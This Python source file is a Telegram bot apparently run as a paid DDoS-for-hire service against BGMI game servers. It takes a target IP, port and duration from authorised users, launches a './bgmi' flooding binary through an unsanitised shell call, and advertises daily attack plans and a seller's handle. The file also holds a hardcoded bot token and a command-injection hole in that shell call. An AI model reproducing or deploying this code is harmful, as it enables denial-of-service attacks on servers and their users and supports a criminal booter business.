import telebot
import subprocess
import requests
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('7577845413:AAE1CZcV4wQrxSjb9xUIS8c0HsGHr8glwtM')

# Admin user IDs
admin_id = ["6710024903"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully 👍."
            else:
                response = "𝑨𝑹𝑬 𝑩𝑨𝑺 𝑲𝑨𝑹 𝑬𝑲 𝑩𝑨𝑵𝑫𝑬 𝑲𝑶 𝑲𝑰𝑻𝑵𝑰 𝑩𝑨𝑹 𝑷𝑬𝑳𝑬𝑮𝑨."
        else:
            response = "𝑷𝑳𝑬𝑨𝑬𝑬 𝑵𝑬𝑬𝑫 𝑨 𝑼𝑺𝑬𝑹 𝑰𝑫 𝑻𝑶 𝑨𝑫𝑫 𝑴𝑬𝑴𝑩𝑬𝑹𝑺 😒."
    else:
        response = "𝑶𝑵𝑳𝒀 𝑷𝑨𝑷𝑨 𝑪𝑨𝑵 𝑫𝑶 𝑻𝑯𝑰𝑺 💀."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "𝑶𝑵𝑳𝒀 𝑷𝑨𝑷𝑨 𝑪𝑨𝑵 𝑫𝑶 𝑻𝑯𝑰𝑺."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "𝑶𝑵𝑳𝒀 𝑷𝑨𝑷𝑨 𝑪𝑨𝑵 𝑫𝑶 𝑻𝑯𝑰𝑺 💀."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "𝑶𝑵𝑳𝒀 𝑷𝑨𝑷𝑨 𝑪𝑨𝑵 𝑫𝑶 𝑻𝑯𝑰𝑺 💀."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "𝑶𝑵𝑳𝒀 𝑷𝑨𝑷𝑨 𝑪𝑨𝑵 𝑫𝑶 𝑻𝑯𝑰𝑫 😡."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑻𝑨𝑹𝑻𝑬𝑫.☠️🕸️\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP-UDP-BGMI BY:- @SPIDYCRACKS"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
                response = "𝑨𝑹𝑬 𝑩𝑨𝑺 𝑲𝑨𝑹 𝑩𝑯𝑨𝑰 𝑨𝑩 2𝑴𝑰𝑵𝑰𝑻𝑼𝑺 𝑹𝑼𝑲 𝑱𝑨𝑨. 𝑷𝑳𝑬𝑨𝑺𝑬 𝑾𝑨𝑰𝑻 2 𝑴𝑰𝑵𝑰𝑻𝑼𝑺 𝑩𝑬𝑭𝑶𝑹𝑬 𝑹𝑼𝑵𝑵𝑰𝑵𝑮 𝑻𝑯𝑬 /bgmi 𝑪𝑶𝑴𝑴𝑨𝑵𝑫 𝑨𝑮𝑨𝑰𝑵."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 600:
                response = "𝑬𝑹𝑹𝑶𝑹: 𝑻𝑰𝑴𝑬  𝑴𝑼𝑺𝑻 𝑩𝑬 𝑳𝑬𝑺𝑺 𝑻𝑯𝑬𝑵 600 ."
            else:
                record_command_logs(user_id, 'bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} "
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
    else:
        response = """❌ 𝒀𝑶𝑼 𝑨𝑹𝑬 𝑵𝑶𝑻 𝑨𝑼𝑻𝑯𝑶𝑹𝑹𝑰𝒁𝑬𝑫 𝑻𝑶 𝑼𝑺𝑬 𝑻𝑯𝑰𝑺 𝑪𝑶𝑴𝑴𝑨𝑵𝑫 ❌.
 🛒 𝑫𝑴 𝑯𝑬𝑹𝑬 𝑻𝑶 𝑩𝑼𝒀 𝑨𝑪𝑪𝑬𝑺𝑺 :- @SPIDYCRACKS"""

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "𝒀𝑶𝑼 𝑨𝑹𝑬 𝑵𝑶 𝑨𝑫𝑴𝑰𝑵 𝑻𝑶 𝑼𝑺𝑬 𝑻𝑯𝑰𝑺 𝑪𝑶𝑴𝑴𝑨𝑵𝑺 💀."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 Available commands:
🚀 /bgmi : Method For Bgmi Servers. 
🚀 /rules : Please Check Before Use !!.
🚀 /mylogs : To Check Your Recents Attacks.
🚀 /plan : Checkout Our Botnet Rates.

🤖 To See Admin Commands:
💥 /admincmd : Shows All Admin Commands.

🚀 𝑩𝑼𝒀 𝑯𝑬𝑹𝑬:- @SPIDYCRACKS
🚀 𝑶𝑭𝑭𝑰𝑪𝑰𝑨𝑳 𝑪𝑯𝑨𝑵𝑵𝑬𝑳:- @SPIDYCRACKS
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''𝑾𝑬𝑳𝑪𝑶𝑴𝑬 𝑻𝑶 𝑺𝑷𝑰𝑫𝒀𝑪𝑹𝑨𝑲𝑺 𝑫𝑫𝒐𝑺 𝑩𝑶𝑻:- @SPIDYCRACKS
 🤖𝒀𝑶𝑼 𝑪𝑨𝑵 𝑴𝑶𝑹𝑬 𝑬𝑿𝑷𝑳𝑶𝑨𝑹 𝑱𝑶𝑰𝑵 
 ✅𝑱𝑶𝑰𝑵 :- @SPIDYCRACKS'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. 1 𝑨𝑻𝑻𝑨𝑪𝑲 𝑰𝑺 𝑨𝑳𝑳𝑹𝑬𝑨𝑫𝒀 𝑹𝑼𝑵 𝑫𝑰𝑵𝑻 𝑻𝑶 2𝑨𝑵 𝑨𝑻𝑻𝑨𝑪𝑲 𝑩𝑬𝑨𝑪𝑼𝑺𝑬 𝑩𝑶𝑻 𝑩𝑨𝑵 𝒀𝑶𝑼 💌'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Our Bgmi Ddos Plans:


𝑩𝑮𝑴𝑰 𝑫𝑫𝒐𝑺 𝑷𝑳𝑨𝑵 
1 𝗛𝗢𝗨𝗥 :- 10𝗥𝗦 [ 600𝘀𝗲𝗰 ]
1 𝗱𝗮𝘆 = 60𝗿𝘀 [ 600𝘀𝗲𝗰 ] 
2 𝗱𝗮𝘆 = 100𝗿𝘀 [ 600𝘀𝗲𝗰 ]
3 𝗱𝗮𝘆 = 150𝗿𝘀 [ 600𝘀𝗲𝗰 ]
7 𝗱𝗮𝘆 = 300𝗿𝘀 [ 600𝘀𝗲𝗰 ]
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝑷𝑨𝑷𝑨 𝑨𝑷𝑲𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorized Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "𝑶𝑵𝑳𝒀 𝑷𝑨𝑷𝑨 𝑪𝑨𝑵 𝑫𝑶 𝑻𝑯𝑰𝑺 😡."

    bot.reply_to(message, response)




if __name__ == "__main__":
    while True:
        try:
            bot.polling(none_stop=True)
        except requests.exceptions.ReadTimeout:
            print("Request timed out. Trying again...")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
            time.sleep(1)  # wait for 1 second before restarting bot polling to avoid flooding
